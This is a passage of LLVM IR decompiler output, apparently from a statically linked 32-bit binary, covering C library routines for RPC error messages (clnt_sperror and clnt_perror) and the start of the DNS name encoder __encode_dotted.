  %v8_805a367 = inttoptr i32 %v7_805a367 to i32*
  %v9_805a367 = load i32, i32* %v8_805a367, align 4
  call void @__pseudo_call(i32 %v9_805a367)
  %v3_805a37a = call i32 @sprintf(i32 ptrtoint ([5 x i8]* @global_var_805d10a.358 to i32), i32 %arg1)
  store i32 %v3_805a37a, i32* %eax.global-to-local, align 4
  %v3_805a386 = add i32 %v3_805a37a, %v3_805a348
  store i32 %v3_805a386, i32* @ebx, align 4
  %v1_805a38a = call i32 @__GI_clnt_sperrno(i32 %tmp18)
  store i32 %v1_805a38a, i32* @eax, align 4
  %v0_805a393 = load i32, i32* @ebx, align 4
  %v5_805a393 = inttoptr i32 %v0_805a393 to i8*
  %v5_805a394 = call i32 @strcpy(i8* %v5_805a393, i32 %v1_805a38a)
  store i32 %v5_805a394, i32* %eax.global-to-local, align 4
  %v0_805a399 = load i32, i32* @ebx, align 4
  %v4_805a399 = inttoptr i32 %v0_805a399 to i8*
  %v3_805a39c = call i32 @strlen(i8* %v4_805a399)
  %v0_805a3ac = load i32, i32* @ebx, align 4
  %v2_805a3ac = add i32 %v0_805a3ac, %v3_805a39c
  store i32 %v2_805a3ac, i32* @esi, align 4
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  switch i32 %tmp18, label %dec_label_pc_805a478 [
    i32 0, label %dec_label_pc_805a496
    i32 1, label %dec_label_pc_805a496
    i32 2, label %dec_label_pc_805a496
    i32 3, label %dec_label_pc_805a3c3
    i32 4, label %dec_label_pc_805a3c3
    i32 5, label %dec_label_pc_805a496
    i32 6, label %dec_label_pc_805a463
    i32 7, label %dec_label_pc_805a3f7
    i32 8, label %dec_label_pc_805a496
    i32 9, label %dec_label_pc_805a463
    i32 10, label %dec_label_pc_805a496
    i32 11, label %dec_label_pc_805a496
    i32 12, label %dec_label_pc_805a496
    i32 13, label %dec_label_pc_805a496
    i32 14, label %dec_label_pc_805a496
    i32 15, label %dec_label_pc_805a496
    i32 16, label %dec_label_pc_805a496
    i32 17, label %dec_label_pc_805a496
  ]

dec_label_pc_805a3c3:                             ; preds = %dec_label_pc_805a359, %dec_label_pc_805a359
  %v2_805a3c9 = ptrtoint i32* %stack_var_-1056 to i32
  store i32 %v2_805a3c9, i32* @ebx, align 4
  %v3_805a3ce = load i32, i32* %stack_var_-28, align 4
  %v5_805a3d5 = call i32 @__GI___glibc_strerror_r(i32 %v3_805a3ce, i32 %v2_805a3c9, i32 1024)
  store i32 %v5_805a3d5, i32* %eax.global-to-local, align 4
  %v0_805a48b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a48b

dec_label_pc_805a3e8:                             ; preds = %dec_label_pc_805a402
  %v2_805a3e8 = add i32 %v1_805a402, ptrtoint (i32* @global_var_805d1e4.362 to i32)
  %v3_805a3e8 = inttoptr i32 %v2_805a3e8 to i32*
  %v4_805a3e8 = load i32, i32* %v3_805a3e8, align 4
  %v1_805a3ef = add i32 %v4_805a3e8, ptrtoint ([18 x i8]* @global_var_805d220.363 to i32)
  br label %dec_label_pc_805a413

dec_label_pc_805a3f7:                             ; preds = %dec_label_pc_805a359
  %v3_805a3f7 = load i32, i32* %stack_var_-28, align 4
  store i32 0, i32* @eax, align 4
  br label %dec_label_pc_805a402

dec_label_pc_805a402:                             ; preds = %dec_label_pc_805a3f7, %dec_label_pc_805a40b
  %v0_805a41339 = phi i32 [ 0, %dec_label_pc_805a3f7 ], [ %v1_805a40b, %dec_label_pc_805a40b ]
  %v1_805a402 = mul nuw nsw i32 %v0_805a41339, 8
  %v2_805a402 = add i32 %v1_805a402, ptrtoint (i32* @global_var_805d1e0.364 to i32)
  %v3_805a402 = inttoptr i32 %v2_805a402 to i32*
  %v4_805a402 = load i32, i32* %v3_805a402, align 8
  %v16_805a402 = icmp eq i32 %v4_805a402, %v3_805a3f7
  br i1 %v16_805a402, label %dec_label_pc_805a3e8, label %dec_label_pc_805a40b

dec_label_pc_805a40b:                             ; preds = %dec_label_pc_805a402
  %v1_805a40b = add nuw nsw i32 %v0_805a41339, 1
  store i32 %v1_805a40b, i32* @eax, align 4
  %tmp = icmp ult i32 %v1_805a40b, 8
  br i1 %tmp, label %dec_label_pc_805a402, label %dec_label_pc_805a411

dec_label_pc_805a411:                             ; preds = %dec_label_pc_805a40b
  br label %dec_label_pc_805a413

dec_label_pc_805a413:                             ; preds = %dec_label_pc_805a3e8, %dec_label_pc_805a411
  %storemerge5 = phi i32 [ 0, %dec_label_pc_805a411 ], [ %v1_805a3ef, %dec_label_pc_805a3e8 ]
  store i32 %storemerge5, i32* @edi, align 4
  %v5_805a41a = inttoptr i32 %v2_805a3ac to i8*
  %v5_805a41b = call i32 @strcpy(i8* %v5_805a41a, i32 ptrtoint ([9 x i8]* @global_var_805d148.365 to i32))
  store i32 %v5_805a41b, i32* %eax.global-to-local, align 4
  %v0_805a420 = load i32, i32* @esi, align 4
  %v4_805a420 = inttoptr i32 %v0_805a420 to i8*
  %v3_805a423 = call i32 @strlen(i8* %v4_805a420)
  store i32 %v3_805a423, i32* @eax, align 4
  %v0_805a42b = load i32, i32* @edi, align 4
  %v1_805a42b = icmp eq i32 %v0_805a42b, 0
  %v0_805a42d = load i32, i32* @esi, align 4
  %v2_805a42d = add i32 %v0_805a42d, %v3_805a423
  store i32 %v2_805a42d, i32* @ebx, align 4
  br i1 %v1_805a42b, label %dec_label_pc_805a44b, label %dec_label_pc_805a432

dec_label_pc_805a432:                             ; preds = %dec_label_pc_805a413
  %v5_805a435 = inttoptr i32 %v2_805a42d to i8*
  %v5_805a436 = call i32 @strcpy(i8* %v5_805a435, i32 %v0_805a42b)
  store i32 %v5_805a436, i32* %eax.global-to-local, align 4
  %v0_805a43b = load i32, i32* @ebx, align 4
  %v4_805a43b = inttoptr i32 %v0_805a43b to i8*
  %v3_805a43e = call i32 @strlen(i8* %v4_805a43b)
  store i32 %v3_805a43e, i32* %eax.global-to-local, align 4
  %v0_805a446 = load i32, i32* @ebx, align 4
  %v2_805a446 = add i32 %v0_805a446, %v3_805a43e
  store i32 %v2_805a446, i32* @esi, align 4
  br label %dec_label_pc_805a496

dec_label_pc_805a44b:                             ; preds = %dec_label_pc_805a413
  %v4_805a459 = call i32 @sprintf(i32 %v2_805a42d, i32 ptrtoint ([36 x i8]* @global_var_805d151.366 to i32))
  store i32 %v4_805a459, i32* %eax.global-to-local, align 4
  %v0_805a45e = load i32, i32* @ebx, align 4
  %v2_805a45e = add i32 %v0_805a45e, %v4_805a459
  br label %dec_label_pc_805a493

dec_label_pc_805a463:                             ; preds = %dec_label_pc_805a359, %dec_label_pc_805a359
  br label %dec_label_pc_805a48b

dec_label_pc_805a478:                             ; preds = %dec_label_pc_805a359
  br label %dec_label_pc_805a48b

dec_label_pc_805a48b:                             ; preds = %dec_label_pc_805a463, %dec_label_pc_805a3c3, %dec_label_pc_805a478
  %v0_805a48b = phi i32 [ %v2_805a3ac, %dec_label_pc_805a463 ], [ %v0_805a48b.pre, %dec_label_pc_805a3c3 ], [ %v2_805a3ac, %dec_label_pc_805a478 ]
  %v2_805a48c = phi i8* [ getelementptr inbounds ([40 x i8], [40 x i8]* @global_var_805d120.367, i32 0, i32 0), %dec_label_pc_805a463 ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805d113.361, i32 0, i32 0), %dec_label_pc_805a3c3 ], [ getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_805d175.368, i32 0, i32 0), %dec_label_pc_805a478 ]
  %v3_805a48c = ptrtoint i8* %v2_805a48c to i32
  %v4_805a48c = call i32 @sprintf(i32 %v0_805a48b, i32 %v3_805a48c)
  store i32 %v4_805a48c, i32* %eax.global-to-local, align 4
  %v0_805a491 = load i32, i32* @esi, align 4
  %v3_805a491 = add i32 %v0_805a491, %v4_805a48c
  br label %dec_label_pc_805a493

dec_label_pc_805a493:                             ; preds = %dec_label_pc_805a44b, %dec_label_pc_805a48b
  %storemerge = phi i32 [ %v3_805a491, %dec_label_pc_805a48b ], [ %v2_805a45e, %dec_label_pc_805a44b ]
  store i32 %storemerge, i32* @esi, align 4
  br label %dec_label_pc_805a496

dec_label_pc_805a496:                             ; preds = %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a359, %dec_label_pc_805a432, %dec_label_pc_805a493
  %v0_805a496 = phi i32 [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a3ac, %dec_label_pc_805a359 ], [ %v2_805a446, %dec_label_pc_805a432 ], [ %storemerge, %dec_label_pc_805a493 ]
  %v1_805a496 = inttoptr i32 %v0_805a496 to i8*
  store i8 10, i8* %v1_805a496, align 1
  store i32 %v3_805a348, i32* %eax.global-to-local, align 4
  %v0_805a49b = load i32, i32* @esi, align 4
  %v1_805a49b = add i32 %v0_805a49b, 1
  %v2_805a49b = inttoptr i32 %v1_805a49b to i8*
  store i8 0, i8* %v2_805a49b, align 1
  %v0_805a4a9.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805a49f

dec_label_pc_805a49f:                             ; preds = %entry, %dec_label_pc_805a496
  %v0_805a4a9 = phi i32 [ 0, %entry ], [ %v0_805a4a9.pre, %dec_label_pc_805a496 ]
  %v2_805a4a5 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805a4a5, i32* @ebx, align 4
  store i32 %v0_805a339, i32* @esi, align 4
  store i32 %v0_805a338, i32* @edi, align 4
  store i32 %v0_805a337, i32* @ebp, align 4
  ret i32 %v0_805a4a9

; uselistorder directives
  uselistorder i32 %v1_805a40b, { 1, 0, 2 }
  uselistorder i32 %v1_805a402, { 1, 0 }
  uselistorder i32 %v0_805a41339, { 1, 0 }
  uselistorder i32 %v3_805a348, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i8 10, { 15, 14, 0, 1, 2, 12, 3, 4, 5, 6, 7, 13, 11, 8, 9, 10 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 2, 1, 0 }
  uselistorder i32 1024, { 12, 13, 14, 15, 29, 2, 31, 16, 19, 18, 30, 17, 10, 11, 3, 4, 5, 6, 7, 8, 9, 28, 0, 1, 21, 22, 23, 24, 20, 26, 27, 25 }
  uselistorder i32 17, { 15, 17, 0, 18, 3, 1, 16, 7, 14, 4, 5, 2, 8, 9, 10, 11, 12, 20, 6, 19, 13 }
  uselistorder i32 16, { 72, 223, 224, 152, 151, 0, 153, 154, 36, 12, 155, 37, 107, 225, 38, 241, 39, 59, 60, 40, 41, 105, 226, 13, 14, 100, 101, 102, 103, 193, 227, 228, 104, 15, 16, 17, 235, 1, 242, 243, 244, 3, 2, 156, 157, 158, 159, 160, 161, 168, 162, 163, 164, 165, 166, 167, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 86, 87, 236, 106, 52, 61, 69, 108, 109, 110, 237, 111, 112, 113, 114, 115, 238, 88, 34, 70, 31, 89, 90, 53, 91, 92, 54, 93, 94, 95, 96, 97, 98, 99, 239, 240, 42, 75, 76, 43, 116, 117, 118, 119, 120, 121, 245, 194, 195, 196, 197, 202, 203, 229, 230, 231, 232, 233, 234, 249, 44, 45, 73, 62, 147, 74, 122, 146, 123, 257, 246, 11, 35, 247, 5, 4, 248, 7, 6, 63, 179, 180, 50, 18, 51, 32, 46, 268, 181, 182, 183, 184, 185, 186, 198, 199, 187, 188, 189, 190, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 64, 219, 220, 221, 222, 250, 251, 252, 200, 33, 19, 139, 124, 125, 264, 265, 266, 267, 126, 127, 128, 129, 253, 254, 255, 256, 261, 262, 263, 8, 130, 131, 201, 48, 49, 132, 20, 260, 21, 9, 133, 22, 134, 135, 136, 137, 23, 138, 24, 258, 269, 259, 25, 140, 141, 79, 77, 78, 80, 26, 81, 27, 82, 83, 10, 28, 84, 85, 29, 142, 30, 143, 65, 144, 145, 55, 66, 56, 57, 58, 148, 149, 150, 47, 191, 67, 192, 71, 68 }
  uselistorder i32 15, { 5, 3, 4, 7, 2, 8, 6, 9, 11, 10, 0, 1 }
  uselistorder i32 14, { 5, 0, 7, 8, 9, 10, 2, 3, 6, 4, 1 }
  uselistorder i32 13, { 5, 2, 0, 7, 1, 8, 6, 3, 4 }
  uselistorder i32 12, { 61, 0, 175, 176, 146, 147, 148, 1, 149, 35, 92, 2, 98, 36, 37, 179, 70, 93, 94, 95, 96, 156, 97, 3, 188, 189, 182, 190, 191, 192, 193, 194, 195, 53, 51, 16, 52, 17, 18, 19, 20, 21, 22, 23, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 183, 14, 177, 178, 99, 100, 103, 38, 104, 101, 102, 105, 24, 25, 106, 107, 39, 108, 40, 109, 110, 41, 111, 42, 112, 43, 113, 44, 114, 115, 116, 184, 117, 63, 118, 87, 26, 27, 89, 28, 29, 30, 90, 31, 32, 88, 185, 186, 187, 54, 64, 65, 50, 45, 119, 120, 121, 157, 162, 163, 164, 165, 166, 167, 168, 169, 4, 48, 49, 170, 180, 181, 220, 62, 122, 141, 160, 123, 124, 231, 232, 233, 234, 235, 236, 237, 223, 224, 225, 226, 227, 228, 229, 230, 196, 215, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 55, 214, 56, 150, 151, 152, 153, 249, 154, 171, 5, 6, 172, 173, 33, 34, 174, 7, 158, 159, 57, 59, 133, 46, 125, 248, 126, 221, 245, 127, 161, 219, 128, 8, 9, 10, 222, 11, 217, 218, 216, 238, 239, 240, 129, 130, 131, 250, 58, 60, 241, 242, 243, 244, 246, 15, 247, 132, 134, 91, 135, 136, 47, 66, 67, 68, 69, 13, 12, 138, 137, 139, 140, 142, 143, 144, 145, 155 }
  uselistorder i32 11, { 11, 17, 18, 6, 24, 7, 13, 0, 2, 5, 12, 25, 8, 19, 20, 21, 22, 9, 23, 1, 10, 3, 15, 16, 4, 14 }
  uselistorder i32 10, { 22, 16, 0, 29, 30, 31, 32, 33, 34, 1, 10, 17, 2, 6, 35, 7, 24, 25, 14, 8, 9, 18, 3, 21, 23, 27, 11, 36, 19, 12, 4, 5, 13, 15, 26, 28, 20 }
  uselistorder i32 9, { 9, 15, 16, 17, 18, 5, 19, 0, 1, 11, 4, 20, 25, 3, 10, 2, 6, 21, 22, 23, 24, 26, 12, 7, 8, 13, 14 }
  uselistorder i32 7, { 8, 14, 15, 4, 0, 1, 13, 12, 6, 9, 5, 2, 3, 10, 17, 18, 19, 20, 21, 11, 16, 7 }
  uselistorder i32 6, { 14, 21, 22, 0, 1, 17, 2, 18, 3, 16, 8, 10, 23, 5, 15, 11, 12, 9, 25, 24, 6, 7, 4, 13, 19, 20 }
  uselistorder i32 5, { 15, 29, 18, 23, 24, 25, 0, 3, 4, 30, 8, 16, 5, 20, 21, 9, 6, 17, 10, 11, 22, 12, 31, 32, 13, 2, 7, 26, 19, 27, 28, 14, 1 }
  uselistorder i32 3, { 63, 72, 73, 74, 75, 76, 77, 39, 0, 22, 1, 40, 2, 28, 24, 25, 81, 3, 69, 70, 20, 78, 41, 5, 4, 6, 18, 19, 17, 71, 64, 42, 67, 68, 82, 83, 36, 43, 23, 44, 62, 37, 47, 65, 7, 48, 49, 50, 51, 52, 53, 84, 29, 30, 54, 8, 26, 27, 9, 10, 11, 12, 13, 45, 79, 46, 80, 31, 32, 14, 15, 55, 33, 34, 56, 16, 57, 35, 66, 21, 58, 38, 59, 60, 61 }
  uselistorder i32 (i8*, i32)* @strcpy, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 14, 15, 16, 17, 12, 13, 10, 11 }
  uselistorder i32 (i32)* @__GI_clnt_sperrno, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @sprintf, { 2, 5, 1, 4, 3, 0 }
  uselistorder i32 8, { 17, 62, 59, 96, 80, 95, 168, 167, 169, 0, 1, 170, 171, 172, 173, 174, 175, 7, 176, 2, 16, 86, 3, 81, 82, 83, 8, 84, 85, 181, 182, 183, 184, 44, 185, 225, 237, 238, 239, 240, 241, 242, 243, 244, 48, 19, 20, 21, 22, 49, 23, 24, 50, 51, 25, 52, 26, 53, 54, 107, 222, 223, 87, 88, 89, 90, 91, 9, 92, 93, 94, 97, 246, 98, 27, 28, 99, 245, 100, 101, 102, 103, 104, 105, 106, 224, 39, 108, 109, 230, 231, 110, 111, 112, 113, 63, 114, 115, 232, 70, 29, 30, 71, 31, 32, 55, 33, 72, 34, 35, 73, 74, 233, 234, 235, 236, 64, 45, 75, 76, 77, 116, 117, 186, 197, 198, 199, 200, 201, 202, 47, 46, 203, 226, 227, 228, 281, 282, 283, 324, 40, 325, 41, 60, 284, 36, 118, 162, 194, 119, 120, 303, 304, 305, 306, 307, 308, 309, 10, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 11, 247, 248, 249, 250, 251, 252, 57, 12, 58, 13, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 56, 270, 271, 14, 272, 273, 274, 275, 15, 276, 177, 178, 4, 18, 42, 322, 229, 179, 187, 188, 5, 6, 61, 204, 205, 206, 207, 209, 210, 211, 208, 212, 213, 214, 215, 37, 38, 216, 217, 218, 219, 220, 221, 285, 286, 287, 189, 190, 191, 192, 159, 160, 193, 317, 150, 145, 43, 121, 122, 123, 124, 125, 311, 126, 318, 319, 320, 321, 127, 128, 129, 130, 288, 289, 290, 315, 316, 196, 131, 312, 78, 132, 133, 280, 135, 136, 79, 277, 278, 279, 195, 134, 137, 292, 310, 138, 139, 140, 141, 142, 146, 323, 143, 144, 313, 314, 291, 147, 148, 149, 152, 153, 154, 155, 151, 156, 65, 66, 67, 68, 69, 157, 158, 161, 163, 164, 165, 166, 180 }
  uselistorder i32 4, { 126, 224, 167, 426, 427, 335, 336, 337, 331, 329, 330, 332, 333, 334, 0, 23, 338, 339, 340, 341, 342, 343, 344, 345, 346, 65, 100, 168, 169, 170, 66, 67, 68, 347, 90, 1, 225, 226, 428, 429, 91, 209, 148, 24, 25, 2, 292, 26, 27, 28, 171, 172, 173, 174, 175, 176, 30, 29, 177, 178, 179, 180, 32, 31, 33, 34, 35, 435, 436, 437, 438, 439, 440, 374, 375, 181, 182, 442, 443, 459, 69, 460, 461, 462, 463, 464, 465, 466, 36, 468, 467, 251, 348, 349, 350, 351, 352, 353, 106, 354, 355, 356, 357, 109, 70, 358, 359, 360, 361, 71, 72, 73, 110, 74, 75, 111, 76, 362, 77, 363, 112, 78, 113, 114, 149, 3, 150, 4, 151, 5, 152, 6, 444, 183, 63, 430, 431, 432, 433, 92, 37, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 448, 449, 450, 206, 207, 208, 445, 446, 447, 210, 211, 212, 213, 214, 215, 216, 217, 230, 218, 219, 220, 38, 221, 222, 223, 227, 228, 470, 229, 231, 232, 79, 80, 233, 469, 434, 234, 235, 236, 237, 451, 452, 238, 239, 240, 241, 242, 243, 127, 244, 453, 454, 455, 81, 82, 153, 154, 155, 7, 156, 83, 157, 84, 115, 85, 86, 158, 87, 159, 160, 161, 162, 456, 457, 93, 124, 458, 132, 131, 133, 134, 135, 101, 245, 246, 247, 248, 249, 250, 471, 39, 376, 377, 116, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 102, 441, 498, 404, 501, 502, 541, 542, 543, 503, 94, 128, 311, 313, 298, 299, 300, 301, 504, 40, 252, 253, 254, 255, 117, 316, 317, 318, 107, 384, 385, 386, 387, 256, 257, 258, 259, 260, 108, 41, 261, 262, 511, 536, 514, 521, 522, 523, 524, 525, 42, 515, 516, 517, 518, 519, 8, 520, 512, 513, 472, 43, 473, 98, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 64, 494, 495, 99, 496, 44, 537, 535, 312, 118, 364, 365, 95, 366, 367, 368, 369, 9, 45, 10, 540, 46, 370, 302, 405, 47, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 88, 89, 130, 119, 423, 424, 425, 378, 379, 103, 125, 380, 303, 304, 305, 104, 105, 11, 306, 307, 381, 382, 283, 282, 507, 508, 263, 264, 265, 266, 267, 120, 268, 527, 528, 530, 529, 531, 269, 270, 500, 499, 163, 48, 49, 50, 538, 539, 271, 272, 273, 505, 506, 534, 388, 390, 12, 13, 14, 389, 274, 497, 526, 96, 275, 276, 97, 277, 278, 279, 15, 16, 391, 17, 284, 280, 532, 533, 281, 509, 510, 164, 165, 18, 285, 286, 392, 287, 288, 136, 137, 51, 138, 139, 140, 141, 142, 143, 144, 145, 146, 52, 147, 129, 19, 289, 290, 291, 20, 21, 293, 53, 294, 54, 55, 56, 57, 295, 58, 296, 297, 308, 309, 310, 22, 121, 59, 314, 315, 319, 320, 321, 322, 323, 324, 122, 325, 326, 327, 328, 371, 123, 372, 373, 383, 60, 61, 393, 62, 166 }
  uselistorder i32* @ebp, { 45, 46, 47, 27, 4, 28, 29, 30, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 31, 32, 33, 34, 35, 36, 37, 2, 146, 147, 148, 153, 149, 150, 151, 152, 154, 38, 5, 39, 40, 41, 290, 291, 292, 293, 294, 273, 274, 275, 295, 296, 297, 298, 155, 156, 157, 158, 159, 160, 161, 267, 268, 269, 270, 271, 272, 56, 57, 42, 43, 44, 48, 49, 50, 299, 300, 301, 51, 52, 53, 6, 54, 55, 22, 23, 281, 282, 283, 284, 285, 286, 287, 288, 289, 241, 276, 277, 278, 279, 280, 316, 317, 7, 318, 319, 320, 8, 321, 322, 345, 108, 109, 110, 111, 58, 59, 60, 61, 62, 116, 117, 323, 329, 330, 331, 332, 324, 325, 326, 327, 328, 302, 303, 304, 305, 306, 307, 308, 309, 314, 310, 311, 312, 313, 1, 315, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 242, 9, 243, 244, 245, 246, 247, 248, 190, 0, 191, 192, 193, 194, 195, 196, 197, 198, 199, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 3, 266, 24, 25, 26, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 236, 237, 238, 229, 230, 231, 63, 64, 65, 66, 67, 68, 69, 81, 80, 333, 334, 335, 10, 336, 337, 338, 339, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 340, 341, 342, 343, 344, 82, 83, 84, 232, 233, 234, 235, 13, 14, 15, 16, 17, 18, 19, 20, 21, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 112, 113, 114, 115, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 173, 174, 175, 176, 177, 178, 179, 180, 181, 11, 182, 183, 184, 185, 12, 186, 187, 188, 189, 239, 240 }
  uselistorder label %dec_label_pc_805a49f, { 1, 0 }
  uselistorder label %dec_label_pc_805a496, { 14, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_805a493, { 1, 0 }
  uselistorder label %dec_label_pc_805a48b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a413, { 1, 0 }
  uselistorder label %dec_label_pc_805a402, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805a4aa = load i32, i32* @ebx, align 4
  %v0_805a4b2 = load i32, i32* @global_var_8062b70, align 16
  store i32 %v0_805a4b2, i32* @ebx, align 4
  %v2_805a4bc = call i32 @__GI_clnt_sperror(i32 %arg1, i32 %arg2)
  %v0_805a4c1 = load i32, i32* @ebx, align 4
  store i32 %v0_805a4aa, i32* @ebx, align 4
  %v2_805a4cd = call i32 @__GI_fputs(i32 %v2_805a4bc, i32 %v0_805a4c1)
  ret i32 %v2_805a4cd

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fputs, { 6, 5, 4, 3, 1, 2, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805a4d5 = load i32, i32* @edi, align 4
  %v0_805a4d6 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_805a4dd = ptrtoint i8* %arg1 to i32
  store i32 %v4_805a4dd, i32* @edi, align 4
  %v1_805a53c3 = icmp eq i8* %arg1, null
  br i1 %v1_805a53c3, label %dec_label_pc_805a545, label %dec_label_pc_805a540.lr.ph

dec_label_pc_805a540.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805a540

dec_label_pc_805a4e3:                             ; preds = %dec_label_pc_805a540
  %v0_805a4e3 = load i32, i32* @edx, align 4
  %v9_805a4e8 = call i32 @__GI_strchr(i8* %v1_805a540, i32 46, i32 %v0_805a4e3, i32 %v0_805a4e3)
  %v1_805a4f0 = icmp eq i32 %v9_805a4e8, 0
  br i1 %v1_805a4f0, label %dec_label_pc_805a4fc, label %dec_label_pc_805a4f6

dec_label_pc_805a4f6:                             ; preds = %dec_label_pc_805a4e3
  %v1_805a4f8 = load i32, i32* @edi, align 4
  %v2_805a4f8 = sub i32 %v9_805a4e8, %v1_805a4f8
  br label %dec_label_pc_805a50a

dec_label_pc_805a4fc:                             ; preds = %dec_label_pc_805a4e3
  %v0_805a4ff = load i32, i32* @edi, align 4
  %v5_805a4ff = inttoptr i32 %v0_805a4ff to i8*
  %v3_805a500 = call i32 @strlen(i8* %v5_805a4ff)
  br label %dec_label_pc_805a50a

dec_label_pc_805a50a:                             ; preds = %dec_label_pc_805a4f6, %dec_label_pc_805a4fc
  %v0_805a51d = phi i32 [ %v3_805a500, %dec_label_pc_805a4fc ], [ %v2_805a4f8, %dec_label_pc_805a4f6 ]
  store i32 %v0_805a51d, i32* @esi, align 4
  %v1_805a50a = icmp eq i32 %v0_805a51d, 0
  %v3_805a50a = trunc i32 %v0_805a51d to i8
  br i1 %v1_805a50a, label %dec_label_pc_805a559, label %dec_label_pc_805a50e

dec_label_pc_805a50e:                             ; preds = %dec_label_pc_805a50a
  %v1_805a512 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805a512 = sub i32 %arg3, %v1_805a512
  %v1_805a514 = add i32 %v2_805a512, -1
  %v7_805a515 = icmp ult i32 %v0_805a51d, %v1_805a514
  %v1_805a517 = icmp eq i1 %v7_805a515, false
  br i1 %v1_805a517, label %dec_label_pc_805a559, label %dec_label_pc_805a519

dec_label_pc_805a519:                             ; preds = %dec_label_pc_805a50e
  store i32 %arg2, i32* @edx, align 4
  %v4_805a51f = add i32 %v1_805a512, %arg2
  %v5_805a51f = inttoptr i32 %v4_805a51f to i8*
  store i8 %v3_805a50a, i8* %v5_805a51f, align 1
  %v0_805a522 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a522 = add i32 %v0_805a522, 1
  %v0_805a524 = load i32, i32* @edx, align 4
  %v0_805a526 = load i32, i32* @esi, align 4
  %v2_805a527 = add i32 %v1_805a522, %v0_805a524
  %v0_805a529 = load i32, i32* @edi, align 4
  %v2_805a52a = add i32 %v0_805a526, %v1_805a522
  store i32 %v2_805a52a, i32* %ebx.global-to-local, align 4
  %tmp28 = inttoptr i32 %v2_805a527 to i16*
  %v7_805a52d = call i32 @memcpy(i16* %tmp28, i32 %v0_805a529, i32 %v0_805a526)
  %v1_805a539 = add i32 %v9_805a4e8, 1
  br i1 %v1_805a4f0, label %dec_label_pc_805a545, label %dec_label_pc_805a53c

dec_label_pc_805a53c:                             ; preds = %dec_label_pc_805a519
  store i32 %v1_805a539, i32* @edi, align 4
  %v1_805a53c = icmp eq i32 %v1_805a539, 0
  br i1 %v1_805a53c, label %dec_label_pc_805a545, label %dec_label_pc_805a540

dec_label_pc_805a540:                             ; preds = %dec_label_pc_805a540.lr.ph, %dec_label_pc_805a53c
  %v0_805a4e7 = phi i32 [ %v4_805a4dd, %dec_label_pc_805a540.lr.ph ], [ %v1_805a539, %dec_label_pc_805a53c ]
  %v1_805a540 = inttoptr i32 %v0_805a4e7 to i8*
  %v2_805a540 = load i8, i8* %v1_805a540, align 1
  %v3_805a540 = icmp eq i8 %v2_805a540, 0
  %v1_805a543 = icmp eq i1 %v3_805a540, false
